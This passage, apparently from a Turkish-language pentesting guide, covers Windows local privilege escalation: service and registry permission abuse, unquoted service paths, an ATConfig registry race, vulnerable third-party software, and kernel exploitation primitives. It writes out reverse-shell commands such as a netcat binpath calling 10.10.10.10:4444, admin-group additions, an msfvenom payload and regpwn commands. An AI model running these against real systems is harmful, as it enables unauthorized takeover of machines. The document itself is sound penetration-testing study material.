accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı veya etkinleştirilmiş aygıtlarla ilişkili değil._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Hizmet ikili dosyasının yolunu değiştirme**

"Kimliği doğrulanmış kullanıcılar" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin yürütülebilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve yürütmek için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

İzinler çeşitli yollarla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis ikilisinin yeniden yapılandırılmasına olanak tanır.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve servis yapılandırmalarını değiştirme olanağı verir.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme olanağını da sağlar.
- **GENERIC_ALL**: Servis yapılandırmalarını değiştirme olanağını da sağlar.

Bu güvenlik açığının tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Servis ikililerinde zayıf izinler

Bir servis **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa ancak **düşük ayrıcalıklı kullanıcılar servis EXE'sini ya da üst klasörünü değiştirebiliyorsa**, ikiliyi **değiştirip servisi yeniden başlatarak** servis çoğu zaman ele geçirilebilir.

**Bir servisin çalıştırdığı ikiliyi değiştirebiliyor musunuz** veya ikilinin bulunduğu **klasörde yazma izniniz var mı** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servis tarafından çalıştırılan tüm ikilileri **wmic** kullanarak alabilir (system32'de bulunmaz) ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş tehlikeli ACL'leri, özellikle hizmet yürütülebilir dosyasında veya onu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Uygulanabilir bir kötüye kullanım akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` komutuyla hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` komutuyla ikili dosyanın yazılabilir olduğunu doğrulayın.
3. Hizmet ikili dosyasını bir payload veya geçerli bir kötü amaçlı hizmet ikili dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` komutuyla hizmeti yeniden başlatın (ya da yeniden başlatma / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet, normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, yeniden başlatan bir hata eylemi olup olmadığını veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemediğini kontrol edin.

### Services registry değiştirme izinleri

Herhangi bir hizmet registry'sini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **registry**'si üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Özgün izin testi şu şekilde ifade edilmişti:

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** grubunun `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, servis tarafından yürütülen binary değiştirilebilir.

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** grubunun belirli bir servis anahtarında yazma yetkisi veren registry izinlerine sahip olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Registry anahtarı izinleri, servis nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` izinlerinden ayrıdır. Privilege escalation için ayrıca kullanılabilir bir servis yapılandırma alanı, servisi tetikleme yolu ve daha ayrıcalıklı bir servis kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) belgelerine bakın.

Yürütülen binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Kayıt Defteri symlink race ile rastgele HKLM değer yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Kayıt Defteri **symbolic link race**, bu ayrıcalıklı yazmayı **herhangi bir HKLM yoluna** yönlendirerek rastgele HKLM **değer yazma** olanağı sağlar.<sup>[[18]](#references)</sup>

Ana konumlar (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcının kontrolündeki yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini ayarlayın.
2. Güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerinde bir **oplock** ayarlayarak **race'i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefine yönlendiren bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM değer yazma olanağına sahip olduğunuzda, hizmet yapılandırma değerlerinin üzerine yazarak LPE'ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir hizmet seçin (ör. **`msiserver`**) ve yazma işleminden sonra hizmeti tetikleyin. **Not:** Genel exploit uygulaması, race'in bir parçası olarak iş istasyonunu **kilitler**.

Örnek araçlar (RegPwn BOF / bağımsız):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory izinleri

Bir registry üzerinde bu izne sahipseniz, **bu registry'nin altında alt registry'ler oluşturabilirsiniz** anlamına gelir. Windows services söz konusu olduğunda bu, **rastgele kod yürütmek için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Tırnak içine alınmamış Service Paths

Bir executable'ın yolu tırnak işaretleri içinde değilse Windows, boşluktan önce biten her yolu yürütmeye çalışır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları yürütmeye çalışır:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu zafiyeti metasploit ile tespit edip exploit edebilirsiniz:** `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir service binary oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olursa gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmi belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **eylem bağımsız değişkenlerinde** belirtilen betiği de kontrol edin. Aynı durum PowerShell `-File` gibi bir yorumlayıcının açık dosya bağımsız değişkeni için de geçerlidir. Zamanlanmış bir batch dosyası doğrudan bir PowerShell `-File` çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullar ve shell zincirleme işlemleri elle izlenmelidir. Çağıran kullanıcının yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev gerçekten bu eyleme ulaşıyorsa hesaplar arası çalıştırma için bir ipucudur. Yalnızca ekleme izni veren bir ACL betikler açısından önemli olabilir; ancak daha önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına neden olabilir. Privilege escalation iddiasında bulunmadan önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi politikasını doğrulayın. Envanter çıkarma işlemi betiği değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosya, sıradan bir dizin listelemesinde görünmeyen, adlandırılmış bir `:$DATA` akışına sahip olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutları aracılığıyla sunar. Bir sırrı düşündüren akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin gerçekte hangi hesapla kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyalarını kullanabilen `StandaloneRunner.exe` içerir. Bu yardımcıyı ayrıcalıklı bir hesapla başlatan zamanlanmış bir görev veya hizmet, düşük ayrıcalıklı kullanıcıların bu girdilere yazma erişimini, yardımcı çalıştırılabilir dosyanın kendisi korunsa bile, ilgili hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** yan dosyanın oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcıyı bulmak yeterli değildir.

Zamanlanmış bir görev için, eylemin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki yan dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, çalıştırılabilir dosyanın bulunduğu dizin, görevin girdilerini nereden okuduğunun kanıtı değil, doğrulanması gereken bir ipucudur. Proje çalışma dosyası önkoşulunun da karşılanması gerekir. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** (belki birinin üzerine yazıp privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), komut dosyalarını `C:\Windows\Temp` konumuna yazan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Satıcı sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde giderdi. Yüklü tam patch level'ı ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; `2.1` gibi yalnızca dalı belirten bir etiket, etkilenip etkilenmediğini ortaya koyamaz. Enumeration sırasında dosya oluşturmadan veya agent komutlarını tetiklemeden sürüm, servis durumu ve Temp izinleri incelenebilir.

#### ADSelfService Plus SAML servis incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), 6210 ve önceki ADSelfService Plus build'lerini etkiledi; satıcı sorunu 6211 build'inde giderdi. Bu açık yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önem taşır. Bu nedenle, yüklü ürün kaydı veya servis yolu bir bulgudur, ancak açığın varlığını kanıtlamaz: tam build'i, SAML yapılandırma geçmişini, servisin ağdan erişilebilirliğini ve çalıştığı hesabı doğrulayın. Servis üzerinden kod çalıştırma, o hesabın ayrıcalıklarını devralır; SYSTEM olarak çalışması için ilgili instance'ın SYSTEM hesabıyla çalışması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` bulunması ayrı bir şifrelenmiş yedek bulgusudur; kullanılabilir bir kimlik bilgisinin veya bu SAML açığının kanıtı değildir. Rutin enumeration sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Windows Jenkins controller'da job oluşturma veya yapılandırma iznini job'ı başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` izinleri olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir build yolu sağlayabilir, ancak bunun etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Kod, controller'ın veya seçilen agent'ın kimliğiyle çalışır; kayıtlı bir kimlik bilgisi yalnızca job'ın erişebildiği kapsamda kullanılabilir. Ayrıca `JENKINS_HOME` metadata'sına erişimi inceleyin: Jenkins, kimlik bilgisi materyallerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins gizli bilgi depolama](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların bulunması tek başına parolayı ortaya çıkarmaz; **gerekli dosyalara okuma erişimini** ve ayrı bir hesap yeniden kullanım yolunu doğrulayın; paylaşılan çıktılarda gizli bilgileri yazdırmayın. Bu hesabın AD kullanıcı nesnesinde `scriptPath` yazma izni varsa, bunu kullanıcılar arası kod çalıştırma olarak değerlendirmeden önce yazılabilir bir script yolu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış görev tüketicisi olduğunu doğrulayın. Ek grup denetimi için etkin AD izinleri ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini, onu **kuyruğa alma** ve seçilen agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Daha düşük ayrıcalıklı bir hesap script adımı gönderebiliyor ve bu pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, adım [agent'ın yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) çalışır. Kullanıcılar arası veya SYSTEM geçişi olduğunu öne sürmeden önce tam pipeline'ı, branch/resource kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir job'ı ve agent servis kimliğini doğrulayın. Yüklü bir agent, proje rolü veya repository yazma erişimi tek başına yalnızca bir bulgudur; pasif enumeration sırasında build başlatmadan izinleri ve yerel servis metadata'sını inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) senkronizasyon servisini çalıştıran ve SQL veritabanına erişen **ADSync servis hesabını**, dizin izinleri yapılandırılmış sync özelliklerine bağlı olan **AD DS connector hesabından** ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali [ADSync servis hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir sync servisi, yerel yönetici izlenimi veren bir grup veya tek başına veritabanı görünürlüğü, çözülebilir bir kimlik bilgisini ya da domain ayrıcalığı yükseltmesini kanıtlamaz. Gerçek veritabanı okuma izinlerini, servis hesabı/anahtar erişimini, kurulum ve SQL yerleşimini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin enumeration yalnızca servis ve erişim metadata'sını göstermeli; kayıtlı gizli bilgileri sorgulamamalı veya yazdırmamalıdır.

#### Printer driver destek DLL izinleri

Yüklü bir printer driver, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir print işleminde yükleyebilir. Printer WMI enumeration engellense bile üst dizinler ve reparse point'ler dahil olmak üzere ilgili driver dizininin ve DLL'lerin ACL'lerini inceleyin. [Ricoh printer-driver sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [ilk açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/), `PrintIsolationHost.exe` tarafından DLL yüklenmesini anlatıyor. Yazılabilir bir ACL yalnızca bir bulgudur: deny girdileri hesaba katıldıktan sonra etkin yazma erişimini, ilgili driver'ın yüklü olup dosyayı ayrıcalıklı bir kimlik altında yüklediğini ve satıcının güncel driver'ının veya güvenlik programının kurulumu düzeltip düzeltmediğini doğrulayın. Yalnızca dizin adından veya driver sürümünden açığın var olduğu sonucunu çıkarmayın.

### Yazma İzinleri

Bazı özel dosyaları okuyabilmek için bir config dosyasını veya bir Administrator hesabıyla çalıştırılacak bir binary'yi (schedtasks) değiştirebiliyor musunuz kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şunu çalıştırmaktır:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod yürütülmesini sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından yürütülecek bir registry girdisinin veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf, şüpheli/güvenlik açığı bulunan** sürücüleri arayın.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), kernel memory'den doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

İlgili Windows kernel exploitation materyali:

Kullanıcı tarafından yazılabilir read/write register'ları olan bir kernel-mode ring-buffer durumu için [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) bölümüne bakın.

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Güvenlik açığı bulunan çağrının saldırganın kontrolündeki bir Object Manager path'ini açtığı race-condition hatalarında, aramayı kasıtlı olarak yavaşlatmak (max-length bileşenler veya derin directory zincirleri kullanarak) süre aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki hatadan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ını sızdıran **lock-release-before-copy disclosure**.<sup>[[29]](#references)</sup>

Denetim ve exploit notları:

- **Lock altında serbest bırakma + sonrasında cancel**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` işlevlerine ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine geçirebilir.
- **Serbest bırakılan queue object'ini geri alın**: aynı boyutta, saldırganın kontrolündeki bir paged-pool allocation kullanın. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyut kontrol edilebilir, ayrıca sonradan pipe read/peek işlemleriyle incelenebilir. Serbest bırakılan object list link'leri içeriyorsa bunları **kullanıcı belleğindeki sahte request node'larından oluşan döngüsel bir listeyle** üzerine yazın; böylece driver, orijinal liste başlığında durmak yerine saldırganın tanımladığı request structure'larını tekrar tekrar işler.
- **Öngörülebilir bir write'ı geliştirin**: Sahte request, bookkeeping write'larının kullandığı iç içe bir context pointer'ını (timestamps / QPC / refcount-adjacent fields) yönlendiriyorsa **adres kontrollü, ancak değer kontrollü olmayan** bir kernel write elde edebilirsiniz. Bu durumda nihai bir code/data pointer yerine sprayed pool object'inin **length/size** alanını hedefleyin, ardından bozulmuş object'in **out-of-bounds paged-pool read** sağlamasını elde edene kadar spray'i tek tek inceleyin.
- **Raceable disclosure örüntüsü**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa (örneğin serializer'ın nihai allocation boyutunu artıran çok sayıda list/resource girdisi ekleyerek) güvenilirlik artar; çünkü daha uzun süren kopyalama, sistemi çökertmeden değiştirme aralığını genişletir.
- **Pointer bakımından zengin refill hedefleri**: Windows **I/O ring** registered-buffer array'leri mükemmel disclosure hedefleridir; çünkü paged-pool boyutları saldırgan tarafından kontrol edilir (`8 * regBufferCnt`) ve her eleman bir `_IOP_MC_BUFFER_ENTRY` kernel pointer'ıdır. Bu array'lerden birini sızdırıp çevresindeki `IORING_OBJECT`'i bulun, ardından **`RegBuffers`** ve **`RegBuffersCount`** alanlarını bozarak sonraki I/O ring işlemlerinin saldırganın sahte entries'lerini kullanmasını ve keyfi kernel read/write sağlamasını mümkün kılın. Kullanılabilen tek write size sabit bir byte ise (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **overlapping unaligned writes** kullanın, bunu `VirtualAlloc` ile map edin ve sahte registered-buffer array'ini oraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once corrupted I/O ring'den arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow'u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitive'leri

